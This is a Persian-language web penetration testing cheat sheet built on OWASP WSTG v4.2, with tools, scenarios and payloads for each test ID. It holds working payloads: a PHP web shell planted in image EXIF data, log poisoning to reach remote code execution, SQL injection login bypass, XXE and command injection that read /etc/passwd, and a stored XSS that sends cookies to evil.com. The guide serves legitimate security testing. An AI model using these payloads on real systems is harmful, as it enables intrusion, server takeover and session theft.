بر اساس متدولوژی OWASP WSTG v4.2 - همراه با پی‌لودها و سناریوهای عملیاتی

🎯 بخش ویژه: پی‌لودهای Bypass و RCE پیشرفته

نوع پی‌لود کد / ساختار اجرایی (کلیک کنید تا کپی شود) توضیحات و سناریو
SVG XSS (Bypass)
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>
 آپلود به عنوان عکس پروفایل. مناسب برای دور زدن فیلترهای پسوند فایل.
PHP Metadata RCE
exiftool -Comment='<?php system($_GET["cmd"]); ?>' img.jpg
 تزریق وب‌شل در متادیتای تصویر (EXIF) جهت دور زدن بررسی محتوای فایل.
PDF Polyglot XSS
%PDF-1.4 1 0 obj << /Pages 2 0 R /Type /Catalog >> endobj trailer << /Root 1 0 R >> %<script>alert(1)</script>
 فایلی که هم به عنوان PDF معتبر است و هم اسکریپت جاوا اسکریپت اجرا می‌کند.
LFI to RCE (Log Poisoning)
<?php system($_GET['c']); ?>
 ارسال در هدر User-Agent و سپس فراخوانی لاگ سرور (/var/log/apache2/access.log) از طریق LFI.

🔍 ۱. جمع‌آوری اطلاعات (WSTG-INFO)

شناسه دسته‌بندی ابزار سناریو و روش تست عملیاتی
WSTG-INFO-01 موتورهای جستجو Google Dorks استخراج فایل‌های حساس و بک‌آپ‌ها از گوگل:
site:target.com ext:bak OR ext:sql OR ext:env OR ext:log
WSTG-INFO-02 شناسایی وب‌سرور Netcat / Burp ارسال درخواست نامعتبر برای بررسی خطاهای پیش‌فرض و هدرهای Server:
nc -v target.com 80 INVALID / HTTP/1.1 Host: target.com
WSTG-INFO-03 نشت از متافایل‌ها Browser بررسی فایل‌های استاندارد برای یافتن مسیرهای پنهان:
/robots.txt , /sitemap.xml , /.well-known/security.txt
WSTG-INFO-08 شناسایی فریم‌ورک Wappalyzer / curl بررسی کوکی‌های پیش‌فرض (مثل PHPSESSID یا JSESSIONID) و هدر X-Powered-By.

⚙️ ۲. مدیریت پیکربندی (WSTG-CONF)

شناسه دسته‌بندی ابزار سناریو و روش تست عملیاتی
WSTG-CONF-01 بررسی SSL/TLS sslscan / testssl بررسی سایفرسوییت‌های ضعیف و نسخه‌های منسوخ TLS:
sslscan --show-certificate target.com
WSTG-CONF-04 فایل‌های بک‌آپ ffuf / dirb فازینگ دایرکتوری‌ها برای یافتن فایل‌های فشرده سورس کد:
ffuf -w wordlist.txt -u https://target.com/FUZZ.zip -mc 200
WSTG-CONF-05 CORS آسیب‌پذیر Burp Repeater ارسال هدر Origin مخرب. اگر پاسخ شامل Access-Control-Allow-Origin: https://evil.com و Credentials: true بود، آسیب‌پذیر است:
Origin: https://evil.com
WSTG-CONF-06 متدهای HTTP curl تست باز بودن متدهای خطرناک مثل PUT یا DELETE:
curl -v -X OPTIONS https://target.com
WSTG-CONF-07 هدرهای امنیتی Browser (F12) بررسی تب Network برای هدرهای Strict-Transport-Security، X-Frame-Options و Content-Security-Policy.

🔑 ۳ و ۴. هویت و احراز هویت (WSTG-IDNT & AUTHN)

شناسه دسته‌بندی ابزار سناریو و روش تست عملیاتی
WSTG-IDNT-04 شمارش کاربران Burp Intruder تست فرم لاگین/فراموشی رمز. بررسی تفاوت در پیام‌های خطا (مثلاً "کاربر یافت نشد" در برابر "رمز اشتباه است") یا تفاوت در زمان پاسخگویی سرور.
WSTG-AUTHN-02 اعتبارنامه‌های پیش‌فرض Hydra / Burp تست پسوردهای پیش‌فرض رایج روی پنل‌های ادمین (admin:admin, root:toor, tomcat:tomcat).
WSTG-AUTHN-03 قفل اکانت (Lockout) Burp Intruder ارسال متوالی ۳۰ درخواست لاگین با پسورد غلط برای یک یوزر خاص و بررسی اینکه آیا اکانت قفل می‌شود یا خیر.
WSTG-AUTHN-04 بایپس احراز هویت Burp Suite تزریق SQL در فیلد نام کاربری برای دور زدن لاگین:
admin' OR '1'='1'#

🛡️ ۵. مجوزها و دسترسی‌ها (WSTG-AUTHZ)

شناسه دسته‌بندی ابزار سناریو و روش تست عملیاتی
WSTG-AUTHZ-01 پیمایش مسیر (LFI) Burp Suite دستکاری پارامترهای خواندن فایل جهت دسترسی به فایل‌های حساس سرور:
../../../../../../etc/passwd%00
WSTG-AUTHZ-02 ارتقاء سطح دسترسی Autorize (Burp) لاگین با یوزر عادی و تلاش برای دسترسی به اندپوینت‌های ادمین (مثلاً /admin/deleteUser).
WSTG-AUTHZ-04 آسیب‌پذیری IDOR Burp Repeater تغییر پارامترهای شناسایی عددی یا UUID در درخواست‌ها (مثلاً تغییر user_id=101 به 102) برای مشاهده اطلاعات سایر کاربران.

⏳ ۶. مدیریت نشست‌ها (WSTG-SESS)

شناسه دسته‌بندی ابزار سناریو و روش تست عملیاتی
WSTG-SESS-01 تثبیت نشست (Fixation) Browser ارسال یک سشن ID معتبر به قربانی در URL. در صورت لاگین قربانی، آیا سشن ID تغییر می‌کند؟ اگر نه، آسیب‌پذیر است.
WSTG-SESS-02 فلگ‌های کوکی Burp Suite بررسی تب Response لاگین؛ کوکی‌های نشست (Session) حتماً باید دارای فلگ‌های امنیتی باشند:
Set-Cookie: session=123; Secure; HttpOnly; SameSite=Strict
WSTG-SESS-06 ابطال نشست (Logout) Burp Repeater کپی کردن یک درخواست احراز هویت شده، انجام عمل Logout در مرورگر، و سپس ارسال مجدد درخواست در Burp. اگر جواب داد، سشن سمت سرور باطل نشده است.
WSTG-SESS-08 تایم‌اوت نشست Browser رها کردن تب اپلیکیشن به مدت ۱۵ الی ۳۰ دقیقه بدون هیچ فعالیتی. آیا پس از این مدت سشن اکسپایر می‌شود؟

💉 ۷. اعتبارسنجی ورودی‌ها (WSTG-INPV)

شناسه دسته‌بندی ابزار سناریو و روش تست عملیاتی
WSTG-INPV-01 XSS انعکاسی Browser تست پارامترهای URL و فرم‌های جستجو. استفاده از پی‌لود دور زدن WAF:
<svg/onload=prompt(document.cookie)>
WSTG-INPV-02 XSS ذخیره‌شده Browser تزریق در بخش کامنت‌ها، نام کاربری یا تیکت‌های پشتیبانی:
<img src="x" onerror="fetch('https://evil.com/?c='+document.cookie)">
WSTG-INPV-05 تزریق SQL (SQLi) Burp / SQLMap استفاده از کاراکتر سینگل‌کوتیشن یا توابع تاخیر زمانی (Time-based):
id=1'; WAITFOR DELAY '0:0:10'--
WSTG-INPV-09 تزریق XML (XXE) Burp Suite تغییر فرمت درخواست به XML و تزریق انتیتی‌های خارجی:
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <data>&xxe;</data>
WSTG-INPV-11 تزریق دستور (OS) Burp Suite افزودن دستورات سیستم‌عامل به ورودی‌های اجرایی (مثل IP Ping):
127.0.0.1; cat /etc/passwd #
WSTG-INPV-17 Host Header Injection Burp Repeater تغییر هدر Host در درخواست‌های فراموشی رمز عبور جهت مسموم کردن لینک ریست پسورد:
Host: evil-attacker.com
WSTG-INPV-18 تزریق قالب (SSTI) Burp Suite تست موتورهای قالب‌ساز (مثل Jinja2 یا Twig) با تزریق عبارات ریاضی:
${7*7} یا {{7*7}}

⚠️ ۸ و ۹. مدیریت خطا و رمزنگاری (WSTG-ERRH & CRYP)

شناسه دسته‌بندی ابزار سناریو و روش تست عملیاتی
WSTG-ERRH-01 نشتی اطلاعات در خطا Burp Suite ارسال کاراکترهای نامعتبر مثل %00 یا آرایه‌های PHP (id[]=1) برای وادار کردن سرور به نمایش Stack Trace پایگاه داده.
WSTG-CRYP-03 داده‌های حساس (Cleartext) Wireshark بررسی ترافیک شبکه تا اطمینان حاصل شود که هیچ توکن، رمز عبور یا داده PII روی پروتکل‌های غیرامن (HTTP/FTP) ارسال نمی‌شود.

💼 ۱۰. منطق تجاری (WSTG-BUSL)

شناسه دسته‌بندی ابزار سناریو و روش تست عملیاتی
WSTG-BUSL-01 اعتبارسنجی منطق داده Burp Suite تغییر پارامترهای عددی حساس مانند تغییر تعداد آیتم سبد خرید به عدد منفی برای کاهش مبلغ نهایی فاکتور:
quantity=-5&price=1000
WSTG-BUSL-02 جعل درخواست Browser (F12) بررسی فرم‌های HTML و فیلدهای پنهان (Hidden) جهت دور زدن مراحل پرداخت یا تغییر پارامترهای وضعیت کاربری:
<input type="hidden" name="is_admin" value="true">
WSTG-BUSL-06 دور زدن مراحل (Workflow) Burp Suite کپی کردن لینک مرحله نهایی پرداخت (مرحله موفقیت‌آمیز) و فراخوانی آن پیش از انجام واریز وجه، جهت بررسی دریافت محصول بدون پرداخت.

💻 ۱۱. آسیب‌پذیری‌های سمت کلاینت (WSTG-CLNT)

شناسه دسته‌بندی ابزار سناریو و روش تست عملیاتی
WSTG-CLNT-01 DOM Based XSS Browser تزریق پی‌لود در Fragment هشتگ URL (بخشی که به سرور ارسال نمی‌شود) برای تست Sink های جاوا اسکریپت:
https://target.com/page#<img src=x onerror=alert(1)>
WSTG-CLNT-09 Clickjacking HTML Script تلاش برای لود کردن وب‌سایت در یک iframe روی دامنه تستر برای بررسی عدم وجود هدر X-Frame-Options:
<iframe src="https://target.com/settings" opacity="0.5"></iframe>
WSTG-CLNT-10 تست WebSockets Burp WebSockets رهگیری ترافیک تبادل شده در WebSocket و دستکاری پیام‌ها جهت بررسی وجود XSS یا SQLi در داده‌های لحظه‌ای (Real-time).
WSTG-CLNT-11 Web Storage Browser Console بررسی تب Application در مرورگر (Local/Session Storage). استخراج اطلاعات حساس یا توکن‌های JWT با دستور:
console.log(localStorage.getItem('access_token'));
